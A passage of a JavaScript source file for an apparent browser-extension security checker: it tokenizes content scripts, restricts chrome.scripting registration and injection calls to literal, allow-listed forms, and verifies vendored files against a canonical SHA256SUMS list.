}

// Whether a '/' after token `prev` opens a regular expression. Where JavaScript itself needs the
// parse to decide (after ')', ']' or '}', and after of, await or yield, which may be plain names),
// either reading can hide code inside a literal: `strict` scans refuse a '/' there (slashIsAmbiguous),
// other scans read it as division after ')', ']' and '}' and as a regular expression after the
// keywords.
function slashIsAmbiguous(prev) {
  if (!prev) return false;
  if (prev.t === 'p') return [')', ']', '}'].includes(prev.v);
  return prev.t === 'id' && ['of', 'await', 'yield'].includes(prev.v);
}
function regexAllowed(prev) {
  if (!prev) return true;
  if (prev.t === 'id') return EXPRESSION_KEYWORDS.has(prev.v);
  if (prev.t === 'p') return ![')', ']', '}', '++', '--'].includes(prev.v);
  if (prev.t === 'tpl') return prev.open;
  return false;
}

// A small JavaScript tokenizer for the content-script rule: comments are dropped; strings,
// template parts and regular expressions become single tokens, so names inside them are not code.
// It fails closed: what it cannot read (an unterminated literal or comment, a backslash in code,
// with `strict` a '/' that may be division or a regular expression, without `escapes` a \x, \u or
// octal escape in a literal) is a problem, and the rest of the file is not scanned.
// → { tokens: [{ t: 'id'|'num'|'str'|'tpl'|'re'|'p', v, i, open? }], problems: [{ i, what }] }
function jsTokens(text, { strict = false, escapes = false } = {}) {
  const tokens = [];
  const problems = [];
  const braces = []; // one entry per open '{': true when it is a template's '${'
  let i = 0;
  while (i < text.length) {
    const c = text[i];
    const prev = tokens[tokens.length - 1];
    if (/\s/.test(c)) {
      i += 1;
    } else if (c === '/' && text[i + 1] === '/') {
      // A line comment ends at any line terminator, not only '\n'.
      i += 2;
      while (i < text.length && !LINE_END.test(text[i])) i += 1;
    } else if (c === '/' && text[i + 1] === '*') {
      const e = text.indexOf('*/', i + 2);
      if (e < 0) {
        problems.push({ i, what: 'unterminated comment' });
        break;
      }
      i = e + 2;
    } else if (c === '"' || c === "'" || c === '`' || (c === '}' && braces[braces.length - 1] === true)) {
      if (c === '}') braces.pop();
      const quote = c === '}' ? '`' : c;
      const r = readQuoted(text, c === '}' || c === '`' ? i + 1 : i, quote, escapes);
      if (r.problem) {
        problems.push({ i, what: r.problem });
        break;
      }
      tokens.push(quote === '`' ? { t: 'tpl', v: r.value, i, open: r.open } : { t: 'str', v: r.value, i });
      if (r.open) braces.push(true);
      i = r.end;
    } else if (c === '/' && strict && slashIsAmbiguous(prev)) {
      problems.push({ i, what: `'/' right after '${prev.v}' (division or a regular expression; a text scan cannot tell which)` });
      break;
    } else if (c === '/' && regexAllowed(prev)) {
      const e = regexEnd(text, i);
      if (e < 0) {
        problems.push({ i, what: 'unterminated regular expression' });
        break;
      }
      tokens.push({ t: 're', v: text.slice(i, e), i });
      i = e;
    } else if (/[A-Za-z_$]/.test(c) || c > '\x7f') {
      let e = i + 1;
      while (e < text.length && (/[\w$]/.test(text[e]) || (text[e] > '\x7f' && !/\s/.test(text[e])))) e += 1;
      tokens.push({ t: 'id', v: text.slice(i, e), i });
      i = e;
    } else if (/\d/.test(c) || (c === '.' && /\d/.test(text[i + 1] ?? ''))) {
      NUMBER.lastIndex = i;
      const m = NUMBER.exec(text);
      const e = m ? i + m[0].length : i + 1;
      tokens.push({ t: 'num', v: text.slice(i, e), i });
      i = e;
    } else if (c === '\\') {
      problems.push({ i, what: 'backslash outside a string or regular expression (an escaped identifier)' });
      break;
    } else {
      let p = PUNCTUATORS.find((op) => text.startsWith(op, i)) ?? c;
      if (p === '?.' && /\d/.test(text[i + 2] ?? '')) p = '?'; // a ? .5 : b
      if (p === '{') braces.push(false);
      else if (p === '}') braces.pop();
      tokens.push({ t: 'p', v: p, i });
      i += p.length;
    }
  }
  return { tokens, problems };
}

const isPunct = (tok, v) => Boolean(tok) && tok.t === 'p' && tok.v === v;
const isDot = (tok) => isPunct(tok, '.') || isPunct(tok, '?.');

// Index of the token that closes the bracket at tokens[k], or -1.
function closingToken(tokens, k) {
  const open = tokens[k].v;
  const close = { '(': ')', '[': ']', '{': '}' }[open];
  let depth = 0;
  for (let j = k; j < tokens.length; j += 1) {
    if (isPunct(tokens[j], open)) depth += 1;
    else if (isPunct(tokens[j], close)) {
      depth -= 1;
      if (depth === 0) return j;
    }
  }
  return -1;
}

// The comma-separated items between the bracket at tokens[k] and its closing token, as [from, to)
// token ranges (empty ones, such as after a trailing comma, dropped), with the index of the
// closing token; null when it does not close.
function bracketItems(tokens, k) {
  const close = closingToken(tokens, k);
  if (close < 0) return null;
  const items = [];
  let from = k + 1;
  let depth = 0;
  for (let j = k + 1; j < close; j += 1) {
    const tok = tokens[j];
    if (tok.t !== 'p') continue;
    if (tok.v === '(' || tok.v === '[' || tok.v === '{') depth += 1;
    else if (tok.v === ')' || tok.v === ']' || tok.v === '}') depth -= 1;
    else if (tok.v === ',' && depth === 0) {
      if (j > from) items.push([from, j]);
      from = j + 1;
    }
  }
  if (close > from) items.push([from, close]);
  return { items, close };
}

// One item of an object literal: { key, value: [from, to) } for key: value (an identifier, string
// or number key), { key, shorthand: true } for a lone identifier, { other: true } for a spread, a
// computed key, a method or an accessor. `at` is its first token.
function objectProperty(tokens, [from, to]) {
  const first = tokens[from];
  if (['id', 'str', 'num'].includes(first.t) && isPunct(tokens[from + 1], ':')) return { key: first.v, value: [from + 2, to], at: first };
  if (first.t === 'id' && to === from + 1) return { key: first.v, shorthand: true, at: first };
  return { other: true, at: first };
}

// Whether the token range [from, to) is exactly one object literal.
const isObjectLiteral = (tokens, [from, to]) => isPunct(tokens[from], '{') && closingToken(tokens, from) === to - 1;

// Whether tokens[k] starts a function expression: function, async, x => or (...) =>.
function startsFunction(tokens, k) {
  const tok = tokens[k];
  if (!tok) return false;
  if (tok.t === 'id' && (tok.v === 'function' || tok.v === 'async')) return true;
  if (tok.t === 'id') return isPunct(tokens[k + 1], '=>');
  if (isPunct(tok, '(')) {
    const close = closingToken(tokens, k);
    return close >= 0 && isPunct(tokens[close + 1], '=>');
  }
  return false;
}

// A '[' after `prev` is a member access (x[k], f()[k], a[0][1], x?.[k]), not an array literal.
function opensComputedAccess(prev) {
  if (!prev) return false;
  if (prev.t === 'id') return !NOT_COMPUTED_AFTER.has(prev.v);
  if (prev.t === 'p') return prev.v === ')' || prev.v === ']' || prev.v === '?.';
  return prev.t === 'str' || prev.t === 're' || (prev.t === 'tpl' && !prev.open);
}

// What a content-script file uses outside MANIFEST_POLICY's content-script lists. `reads`:
// <global>.<member> reads allowed on top of them (an injected function's injectedReads). → [hit]
function contentScriptHits(text, label, { reads = [] } = {}) {
  const { contentScriptMembers, contentScriptConstructors, contentScriptChrome, contentScriptEvents } = MANIFEST_POLICY;
  const { tokens, problems } = jsTokens(text, { strict: true });
  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what}`);
  // Object destructuring names a property with no '.' before it (const { write } = document), so
  // the member list would not see it: object patterns are refused. A '{' is a pattern after
  // const/let/var, when its '}' is followed by an assignment or `of`/`in`, and anywhere inside a
  // parameter list (of an arrow, a function, a method or a catch clause).
  const pairs = new Map(); // index of '(' / '[' / '{' -> index of its closing token, and back
  const stack = [];
  tokens.forEach((tok, k) => {
    if (tok.t !== 'p') return;
    if (tok.v === '(' || tok.v === '[' || tok.v === '{') stack.push(k);
    else if (tok.v === ')' || tok.v === ']' || tok.v === '}') {
      const open = stack.pop();
      if (open !== undefined) {
        pairs.set(open, k);
        pairs.set(k, open);
      }
    }
  });
  const params = []; // [open, close] token ranges of parameter lists
  tokens.forEach((tok, k) => {
    if (isPunct(tok, '=>') && isPunct(tokens[k - 1], ')') && pairs.has(k - 1)) params.push([pairs.get(k - 1), k - 1]);
    if (!isPunct(tok, '(') || !pairs.has(k)) return;
    const close = pairs.get(k);
    const before = tokens[k - 1];
    // function (, function name (, function* name (, and name (...) { (a method or catch clause;
    // the statements whose head is followed by a block are not).
    const functionHead =
      before?.v === 'function' ||
      (isPunct(before, '*') && tokens[k - 2]?.v === 'function') ||
      (before?.t === 'id' && (tokens[k - 2]?.v === 'function' || (isPunct(tokens[k - 2], '*') && tokens[k - 3]?.v === 'function')));
    const blockHead = before?.t === 'id' && !['if', 'while', 'for', 'switch', 'with'].includes(before.v) && isPunct(tokens[close + 1], '{');
    if (functionHead || blockHead) params.push([k, close]);
  });
  tokens.forEach((tok, k) => {
    if (!isPunct(tok, '{')) return;
    const close = pairs.get(k);
    const after = close === undefined ? undefined : tokens[close + 1];
    const pattern =
      ['const', 'let', 'var'].includes(tokens[k - 1]?.v) ||
      (after?.t === 'p' && ASSIGNMENT_OPS.has(after.v)) ||
      (after?.t === 'id' && (after.v === 'of' || after.v === 'in')) ||
      params.some(([open, end]) => k > open && k < end);
    if (pattern) hits.push(`${at(tok)} object destructuring pattern (it names properties without a member access)`);
  });
  // Objects the file itself makes and never rebinds: const <name> = {}, the name bound nowhere else
  // (no other declaration, parameter or assignment). A computed write into one stays off the page.
  const isBinding = (k) =>
    ['const', 'let', 'var', 'function', 'class'].includes(tokens[k - 1]?.v) ||
    (isPunct(tokens[k - 1], '*') && tokens[k - 2]?.v === 'function') ||
    (tokens[k + 1]?.t === 'p' && ASSIGNMENT_OPS.has(tokens[k + 1].v)) ||
    params.some(([open, end]) => k > open && k < end);
  const freshObjects = new Set();
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id' || tokens[k - 1]?.v !== 'const' || isDot(tokens[k - 2])) return;
    if (!isPunct(tokens[k + 1], '=') || !isPunct(tokens[k + 2], '{') || !isPunct(tokens[k + 3], '}')) return;
    const bound = tokens.filter((t, j) => t.t === 'id' && t.v === tok.v && !isDot(tokens[j - 1]) && isBinding(j));
    if (bound.length === 1) freshObjects.add(tok.v);
  });
  // Functions written in the file: function f, and const f = <function expression>.
  const functionNames = new Set();
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id') return;
    const prev = tokens[k - 1];
    if (prev?.v === 'function' || (isPunct(prev, '*') && tokens[k - 2]?.v === 'function')) functionNames.add(tok.v);
    else if (prev?.v === 'const' && isPunct(tokens[k + 1], '=') && startsFunction(tokens, k + 2)) functionNames.add(tok.v);
  });
  const judged = new Set(); // indices of tokens a check has already ruled on
  for (let k = 0; k < tokens.length; k += 1) {
    const tok = tokens[k];
    const prev = tokens[k - 1];
    const next = tokens[k + 1];
    if (tok.t === 'str' || tok.t === 'tpl') {
      if (CONTENT_SINK_STRINGS.includes(tok.v.trim().toLowerCase())) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} names a URL or markup sink`);
      if (/^\s*[\\/]{2}/.test(tok.v)) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} is a protocol-relative URL`);
      if (/\burl\s*\(/i.test(tok.v)) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} holds a CSS url(`);
      continue;
    }
    if (isDot(tok) && next?.t === 'id') {
      // <global>.<member> from `reads`: the global named bare (not x.location), read only.
      const read = prev?.t === 'id' && !isDot(tokens[k - 2]) && reads.includes(`${prev.v}.${next.v}`);
      if (read) {
        const after = tokens[k + 2];
        const before = tokens[k - 2];
        const writes = (after?.t === 'p' && (ASSIGNMENT_OPS.has(after.v) || after.v === '++' || after.v === '--')) || isPunct(before, '++') || isPunct(before, '--');
        if (writes) hits.push(`${at(tok)} write to ${prev.v}.${next.v} (it may only be read)`);
      } else if (!judged.has(k + 1) && !contentScriptMembers.includes(next.v)) hits.push(`${at(tok)} .${next.v} is not on the content-script member list`);
      judged.add(k + 1);
      continue;
    }
    if (isPunct(tok, '[') && opensComputedAccess(prev)) {
      const close = closingToken(tokens, k);
      const key = tokens.slice(k + 1, close < 0 ? tokens.length : close);
      if (key.some((t) => t.t === 'str' || t.t === 'tpl')) hits.push(`${at(tok)} computed member access with a string key`);
      const after = tokens[close + 1];
      if (close >= 0 && (isPunct(after, '(') || (isPunct(after, '?.') && isPunct(tokens[close + 2], '(')))) hits.push(`${at(tok)} computed member call`);
      // x[k] = v (or +=, ++, ...) writes a member the list cannot name; x[k].value = v does not
      // reach here as a write. Allowed only into an object the file made (freshObjects).
      const writes = close >= 0 && after?.t === 'p' && (ASSIGNMENT_OPS.has(after.v) || after.v === '++' || after.v === '--');
      const ownObject = prev?.t === 'id' && !isDot(tokens[k - 2]) && freshObjects.has(prev.v);
      if (writes && !ownObject) hits.push(`${at(tok)} assignment to a computed member`);
      continue;
    }
    if (tok.t !== 'id' || judged.has(k)) continue;
    if (tok.v === 'chrome') {
      const [dot1, area, dot2, member] = tokens.slice(k + 1, k + 5);
      const api = isDot(dot1) && area?.t === 'id' && isDot(dot2) && member?.t === 'id' ? `${area.v}.${member.v}` : null;
      if (api && contentScriptChrome.includes(api)) {
        judged.add(k + 2);
        judged.add(k + 4);
      } else hits.push(`${at(tok)} chrome other than chrome.{${contentScriptChrome.join(', ')}}`);
      continue;
    }
    if (tok.v === 'new') {
      const after = tokens[k + 2];
      const shown = next?.t === 'id' ? next.v : (next?.v ?? '');
      if (next?.t !== 'id' || !contentScriptConstructors.includes(next.v) || isDot(after) || isPunct(after, '[')) {
        hits.push(`${at(tok)} new ${shown} (a content script constructs only ${contentScriptConstructors.join(', ')})`);
      } else if (next.v === 'Event') {
        const type = tokens[k + 3];
        const ok = isPunct(after, '(') && type?.t === 'str' && contentScriptEvents.includes(type.v) && (isPunct(tokens[k + 4], ',') || isPunct(tokens[k + 4], ')'));
        if (!ok) hits.push(`${at(tok)} new Event( other than ${contentScriptEvents.map((e) => `'${e}'`).join(' or ')}`);
      }
      if (next) judged.add(k + 1);
      continue;
    }
    if (BARE_CONTENT_SINKS.includes(tok.v)) {
      hits.push(`${at(tok)} ${tok.v} in a content script`);
      continue;
    }
    // A bare `name = ...` (no declaration) assigns window.name.
    if (tok.v === 'name' && next?.t === 'p' && ASSIGNMENT_OPS.has(next.v) && !['const', 'let', 'var'].includes(prev?.v)) {
      hits.push(`${at(tok)} assignment to the global name (window.name)`);
      continue;
    }
    if (TIMERS.includes(tok.v)) {
      const first = tokens[k + 2];
      if (!isPunct(next, '(')) hits.push(`${at(tok)} ${tok.v} other than called directly`);
      else if (
        !startsFunction(tokens, k + 2) &&
        !(first?.t === 'id' && functionNames.has(first.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], ')')))
      ) {
        hits.push(`${at(tok)} ${tok.v} whose first argument is not a function written in the file`);
      }
    }
  }
  return hits;
}

// What one of MANIFEST_POLICY.scriptingFiles (the only files that may call chrome.scripting) puts
// into pages.
// - Registration: the script files it names under a `js:` key. Each must be a literal list of
//   strings, or a const holding one that is used nowhere but as a `js:` value; anything else, and
//   a file that registers content scripts without a readable `js:` key, is a hit.
// - Injection: `func:` may name only one of injectedFunctions; each of those found here
//   (function <name>(...) { ... }) is held to contentScriptHits, must be declared at the top level,
//   and its name may stand nowhere else but as the func: value of a parsed executeScript options
//   literal (any other unqualified use, such as an assignment, a destructuring target, a second
//   binding or a shadowing parameter or local, is a hit); `files` and `css` may not appear at
//   all, and no computed key or member access is spelled with a string or template.
// → { hits: [hit], named: [path], injected: Map(name -> times declared) }
function scriptingFileHits(text, label) {
  const { tokens, problems } = jsTokens(text);
  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what} (the script registration cannot be read)`);
  const named = [];
  const isJsName = (tok) => Boolean(tok) && (tok.t === 'id' || tok.t === 'str') && tok.v === 'js';
  const isJsKey = (k) => isJsName(tokens[k]) && isPunct(tokens[k + 1], ':') && (isPunct(tokens[k - 1], '{') || isPunct(tokens[k - 1], ','));
  // The strings of the list literal opening at tokens[k], with the index of its ']', or null.
  const listAt = (k) => {
    const list = [];
    let j = k + 1;
    while (j < tokens.length && !isPunct(tokens[j], ']')) {
      if (tokens[j].t !== 'str') return null;
      list.push(tokens[j].v);
      j += 1;
      if (isPunct(tokens[j], ',')) j += 1;
      else if (!isPunct(tokens[j], ']')) return null;
    }
    return j < tokens.length ? { list, end: j } : null;
  };
  // `const <name> = [ '...', ... ];`, declared once and otherwise used only as `js: <name>`.
  const constList = (name) => {
    const decls = [];
    let uses = 0;
    tokens.forEach((tok, k) => {
      if (tok.t !== 'id' || tok.v !== name) return;
      if (tokens[k - 1]?.v === 'const' && isPunct(tokens[k + 1], '=') && isPunct(tokens[k + 2], '[')) decls.push(k);
      else if (!(isPunct(tokens[k - 1], ':') && isJsKey(k - 2) && (isPunct(tokens[k + 1], ',') || isPunct(tokens[k + 1], '}')))) uses += 1;
    });
    if (decls.length !== 1 || uses > 0) return null;
    const r = listAt(decls[0] + 2);
    return r && isPunct(tokens[r.end + 1], ';') ? r.list : null;
  };
  let keys = 0;
  tokens.forEach((tok, k) => {
    if (!isJsName(tok)) return;
    if (!isJsKey(k)) {
      hits.push(`${at(tok)} js named other than as the js: key of a script registration`);
      return;
    }
    keys += 1;
    const value = tokens[k + 2];
    let list = null;
    if (isPunct(value, '[')) {
      const r = listAt(k + 2);
      list = r && (isPunct(tokens[r.end + 1], ',') || isPunct(tokens[r.end + 1], '}')) ? r.list : null;
    } else if (value?.t === 'id' && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}'))) {
      list = constList(value.v);
    }
    if (!list) {
      hits.push(`${at(tok)} js: is not a list of string literals or a const holding one (used only as js:)`);
      return;
    }
    for (const rel of list) {
      named.push(rel);
      if (!MANIFEST_POLICY.contentScriptFiles.includes(rel)) hits.push(`${at(tok)} js: names ${rel}, not one of contentScriptFiles (${MANIFEST_POLICY.contentScriptFiles.join(', ')})`);
    }
  });
  if (keys === 0) {
    const call = tokens.find((tok) => tok.t === 'id' && (tok.v === 'registerContentScripts' || tok.v === 'updateContentScripts'));
    if (call) hits.push(`${at(call)} ${call.v} without a js: key in the file naming the scripts`);
  }

  // Injection. A function passed as func: is serialized and run in the page, so its text is held
  // to the content-script lists: everything before it is blanked (newlines kept, so lines match).
  const { injectedFunctions, injectedReads } = MANIFEST_POLICY;
  const injected = new Map(injectedFunctions.map((name) => [name, 0]));
  // Bracket depth before each token; a top-level declaration stands at depth 0 at the start of a
  // statement (the file's start, or after ';' or '}'), optionally after export and async.
  const depth = [];
  let d = 0;
  for (const tok of tokens) {
    if (tok.t === 'p' && (tok.v === ')' || tok.v === ']' || tok.v === '}')) d -= 1;
    depth.push(d);
    if (tok.t === 'p' && (tok.v === '(' || tok.v === '[' || tok.v === '{')) d += 1;
  }
  const topLevel = (k) => {
    let j = k - 1;
    if (tokens[j]?.t === 'id' && tokens[j].v === 'async') j -= 1;
    if (tokens[j]?.t === 'id' && tokens[j].v === 'export') j -= 1;
    return depth[k] === 0 && (j < 0 || isPunct(tokens[j], ';') || isPunct(tokens[j], '}'));
  };
  // Token indices where an injected function's name may stand: its top-level declaration, and the
  // func: value of the options literal of a chrome.scripting.executeScript( call that the call
  // check below has parsed (nowhere else, so not a func: key in a destructuring pattern).
  const allowedUse = new Set();
  tokens.forEach((tok, k) => {
    const name = tokens[k + 1];
    if (tok.t !== 'id' || tok.v !== 'function' || name?.t !== 'id' || !injected.has(name.v) || !isPunct(tokens[k + 2], '(')) return;
    const paren = closingToken(tokens, k + 2);
    const brace = paren >= 0 && isPunct(tokens[paren + 1], '{') ? closingToken(tokens, paren + 1) : -1;
    if (brace < 0) return;
    injected.set(name.v, injected.get(name.v) + 1);
    allowedUse.add(k + 1);
    if (!topLevel(k)) hits.push(`${at(name)} function ${name.v} is not a top-level function declaration (a nested or expression one is not what func: ${name.v} names)`);
    const start = tokens[k - 1]?.v === 'async' ? tokens[k - 1].i : tok.i;
    const body = text.slice(0, start).replace(/[^\n]/g, ' ') + text.slice(start, tokens[brace].i + 1);
    hits.push(...contentScriptHits(body, label, { reads: injectedReads }).map((hit) => `${hit} (in injected ${name.v})`));
  });
  tokens.forEach((tok, k) => {
    if ((tok.t === 'id' || tok.t === 'str') && tok.v === 'files') {
      hits.push(`${at(tok)} files in a scripting file (executeScript may inject only func: ${injectedFunctions.join(', ')})`);
      return;
    }
    if ((tok.t === 'id' || tok.t === 'str') && tok.v === 'css') {
      hits.push(`${at(tok)} css in a scripting file (no CSS is injected or registered)`);
      return;
    }
    if (!((tok.t === 'id' && !isDot(tokens[k - 1])) || tok.t === 'str') || tok.v !== 'func') {
      if (tok.t === 'id' && tok.v === 'func' && isDot(tokens[k - 1])) hits.push(`${at(tok)} .func (an injection is written as func: <name> in the call)`);
      return;
    }
    const isKey = isPunct(tokens[k + 1], ':') && (isPunct(tokens[k - 1], '{') || isPunct(tokens[k - 1], ','));
    const value = tokens[k + 2];
    if (!isKey) hits.push(`${at(tok)} func named other than as the func: key of an injection`);
    else if (!(value?.t === 'id' && injected.has(value.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}')))) {
      hits.push(`${at(tok)} func: ${value?.v ?? ''} is not one of injectedFunctions (${injectedFunctions.join(', ')})`);
    }
  });
  // A computed key or member access spelled with a string or template literal ({ [`func`]: f },
  // o['fu' + 'nc'], globalThis['chr' + 'ome']) names a property that the checks here read only by
  // its spelling, so in a scripting file a computed key or access may hold no string or template.
  tokens.forEach((tok, k) => {
    if (!isPunct(tok, '[')) return;
    const close = closingToken(tokens, k);
    if (close < 0) return;
    const prev = tokens[k - 1];
    const after = tokens[close + 1];
    const keyPosition =
      (['{', ',', ';', '}', '*'].some((p) => isPunct(prev, p)) || (prev?.t === 'id' && ['static', 'get', 'set', 'async'].includes(prev.v))) &&
      (isPunct(after, ':') || isPunct(after, '(') || isPunct(after, '='));
    if (!keyPosition && !opensComputedAccess(prev)) return;
    if (tokens.slice(k + 1, close).some((t) => t.t === 'str' || t.t === 'tpl')) {
      hits.push(`${at(tok)} computed ${keyPosition ? 'key' : 'member access'} with a string or template key in a scripting file`);
    }
  });

  // The calls themselves. An options object built anywhere but in the call (a variable, a call
  // result, an import, a spread, a computed key, Object.fromEntries) carries keys the name checks
  // above never see, so each call takes its options as literals written in it:
  // - executeScript: one object literal with keys from injectionKeys (func required; only args
  //   may be shorthand), whose target: is an object literal with keys from injectionTargetKeys.
  // - registerContentScripts / updateContentScripts: one array literal whose items are object
  //   literals with keys from registrationKeys and a js: key (checked above), or a const holding
  //   one: `const <name> = { ... };`, declared once, its name used nowhere else but as such an
  //   item (not mutated, spread or passed on).
  // Each of the three is called directly (chrome.scripting.<method>(...)), never referenced.
  const { injectionKeys, injectionTargetKeys, registrationKeys } = MANIFEST_POLICY;
  const checkedCalls = new Set(['executeScript', 'registerContentScripts', 'updateContentScripts']);
  // The properties of the literal at tokens[k], each checked against `keys` (those in `shorthand`
  // may be written alone). → Map(key -> property), or null when it does not close.
  const objectProps = (k, keys, shorthand, what) => {
    const r = bracketItems(tokens, k);
    if (!r) {
      hits.push(`${at(tokens[k])} ${what} does not close`);
      return null;
    }
    const props = new Map();
    for (const item of r.items) {
      const p = objectProperty(tokens, item);
      if (p.other) hits.push(`${at(p.at)} ${what} has a spread, computed key or method (only ${keys.join(', ')})`);
      else if (!keys.includes(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} is not one of ${keys.join(', ')}`);
      else if (props.has(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} given twice`);
      else if (p.shorthand && !shorthand.includes(p.key)) hits.push(`${at(p.at)} ${what} key ${p.key} written as shorthand`);
      else props.set(p.key, p);
    }
    return props;
  };
  const checkRegistration = (k) => {
    const props = objectProps(k, registrationKeys, registrationKeys.filter((key) => key !== 'js'), 'content-script registration');
    if (props && !props.has('js')) hits.push(`${at(tokens[k])} content-script registration without a js: key`);
  };
  // `const <name> = { ... };` → name -> [index of the name token, one per declaration]
  const constObjects = new Map();
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id' || tokens[k - 1]?.v !== 'const' || isDot(tokens[k - 2]) || !isPunct(tokens[k + 1], '=') || !isPunct(tokens[k + 2], '{')) return;
    const close = closingToken(tokens, k + 2);
    if (close >= 0 && isPunct(tokens[close + 1], ';')) constObjects.set(tok.v, [...(constObjects.get(tok.v) ?? []), k]);
  });
  const itemUses = new Set(); // token indices where a registration const stands as an item
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id' || tok.v !== 'chrome' || !isDot(tokens[k + 1]) || tokens[k + 2]?.v !== 'scripting' || !isDot(tokens[k + 3])) return;
    const method = tokens[k + 4];
    if (method?.t !== 'id' || !checkedCalls.has(method.v)) return;
    const paren = isPunct(tokens[k + 5], '?.') ? k + 6 : k + 5;
    const shown = `chrome.scripting.${method.v}`;
    if (!isPunct(tokens[paren], '(')) {
      hits.push(`${at(tok)} ${shown} other than called directly`);
      return;
    }
    const open = paren + 1;
    const want = method.v === 'executeScript' ? '{' : '[';
    const end = isPunct(tokens[open], want) ? closingToken(tokens, open) : -1;
    const last = isPunct(tokens[end + 1], ',') ? end + 2 : end + 1;
    if (end < 0 || !isPunct(tokens[last], ')')) {
      hits.push(`${at(tok)} ${shown} takes other than one ${want === '{' ? 'object' : 'array'} literal written in the call (no variable, call result, import or spread)`);
      return;
    }
    if (method.v === 'executeScript') {
      const props = objectProps(open, injectionKeys, ['args'], 'executeScript options');
      if (!props) return;
      const func = props.get('func');
      if (!func) hits.push(`${at(tok)} ${shown} without func: (one of ${injectedFunctions.join(', ')})`);
      else if (func.value && func.value[1] === func.value[0] + 1 && tokens[func.value[0]].t === 'id' && injected.has(tokens[func.value[0]].v)) {
        allowedUse.add(func.value[0]);
      }
      const target = props.get('target');
      if (target && !isObjectLiteral(tokens, target.value)) hits.push(`${at(target.at)} executeScript target: is not an object literal`);
      else if (target) objectProps(target.value[0], injectionTargetKeys, injectionTargetKeys, 'executeScript target');
      return;
    }
    for (const item of bracketItems(tokens, open).items) {
      const [from, to] = item;
      if (isObjectLiteral(tokens, item)) checkRegistration(from);
      else if (to === from + 1 && tokens[from].t === 'id' && constObjects.get(tokens[from].v)?.length === 1) itemUses.add(from);
      else hits.push(`${at(tokens[from])} ${shown} item is not an object literal or a const holding one`);
    }
  });
  for (const name of new Set([...itemUses].map((k) => tokens[k].v))) {
    const [decl] = constObjects.get(name);
    checkRegistration(decl + 2);
    tokens.forEach((tok, k) => {
      if (tok.t !== 'id' || tok.v !== name || isDot(tokens[k - 1]) || k === decl || itemUses.has(k)) return;
      hits.push(`${at(tok)} ${name} (a content-script registration) named other than in its const declaration and as a registerContentScripts/updateContentScripts item`);
    });
  }
  // Anywhere else an unqualified injected name could rebind what func: serializes (an
  // assignment, var/let/const/class/import, a parameter, a destructuring target such as
  // ({ func: fillFocused } = o), a nested declaration). A text scan cannot list every binding
  // form, so every use but the declaration and a parsed executeScript func: value is refused.
  tokens.forEach((tok, k) => {
    if (tok.t !== 'id' || !injected.has(tok.v) || isDot(tokens[k - 1]) || allowedUse.has(k)) return;
    hits.push(`${at(tok)} ${tok.v} named other than in its one top-level declaration and as the func: of an executeScript call (an assignment, a destructuring target, another binding or a shadowing local would inject other code)`);
  });
  return { hits, named, injected };
}

// JSON text of `value` with object keys sorted, so two values compare equal exactly when they
// hold the same keys and values (array order kept).
function canonicalJson(value) {
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(',')}]`;
  if (value !== null && typeof value === 'object') {
    return `{${Object.keys(value)
      .sort()
      .map((k) => `${JSON.stringify(k)}:${canonicalJson(value[k])}`)
      .join(',')}}`;
  }
  return JSON.stringify(value) ?? 'undefined';
}

// SHA256SUMS is accepted only in the form `sha256sum` prints when run inside vendor/:
// `<64 lowercase hex>  <name>` (or ` *<name>`, binary mode), LF line ends, with a plain relative
// name. No other spelling of a name is rewritten into one, so each file has exactly one.
const SUMS_LINE = /^([0-9a-f]{64}) [ *](.*)$/;

// Why `name` is not a plain path relative to vendor/, or null.
function sumsNameProblem(name) {
  if (/[\x00-\x1f\x7f\\]/.test(name)) return 'has a backslash or control character';
  if (name.startsWith('/')) return 'is absolute';
  const parts = name.split('/');
  if (parts.some((p) => p === '' || p === '.' || p === '..')) return 'has an empty, . or .. segment';
  if (parts[0] === 'vendor') return 'starts with vendor/ (names are relative to vendor/)';
  return null;
}

function checkVendorSums(extDir, files, label) {
  const vendorFiles = files.filter((f) => f.rel.startsWith('vendor/') && f.rel !== SUMS_PATH);
  const sumsFile = path.join(extDir, SUMS_PATH);
  if (!fs.existsSync(path.join(extDir, 'vendor'))) return [true, 'no vendor/ directory'];
  if (!fs.existsSync(sumsFile)) return [false, `${label(SUMS_PATH)} missing (${vendorFiles.length} vendored files unverified)`];
  const problems = [];
  const listed = new Map();
  fs.readFileSync(sumsFile, 'utf8')
    .split('\n')
    .forEach((line, i) => {
      if (line === '' || line.startsWith('#')) return; // sha256sum -c skips '#' comment lines too
      const where = `${label(SUMS_PATH)}:${i + 1}`;
      const m = line.match(SUMS_LINE);
      if (!m) {
        problems.push(`${where} not canonical: ${JSON.stringify(line)} is not "<sha256 in lowercase hex>  <name>" or "<sha256> *<name>"`);
        return;
      }
      const nameProblem = sumsNameProblem(m[2]);
      if (nameProblem) {
        problems.push(`${where} not canonical: name ${JSON.stringify(m[2])} ${nameProblem}`);
        return;
      }
      const rel = `vendor/${m[2]}`;
      // A second entry for the same file must not win (or lose) silently.
      if (listed.has(rel)) {
        problems.push(`${where} lists ${rel} again (first at line ${listed.get(rel).line})`);
        return;
      }
      listed.set(rel, { hash: m[1], line: i + 1 });
    });
  for (const f of vendorFiles) {
    const entry = listed.get(f.rel);
    if (!entry) problems.push(`${label(f.rel)} not listed in SHA256SUMS`);
    else if (f.kind !== 'file') problems.push(`${label(f.rel)} is not a regular file`);
    else if (sha256(f.abs) !== entry.hash) problems.push(`${label(f.rel)} sha256 ${sha256(f.abs)} != listed ${entry.hash}`);
  }
  for (const [rel, entry] of listed) {
    if (!vendorFiles.some((f) => f.rel === rel)) problems.push(`${label(SUMS_PATH)}:${entry.line} lists missing ${rel}`);
  }
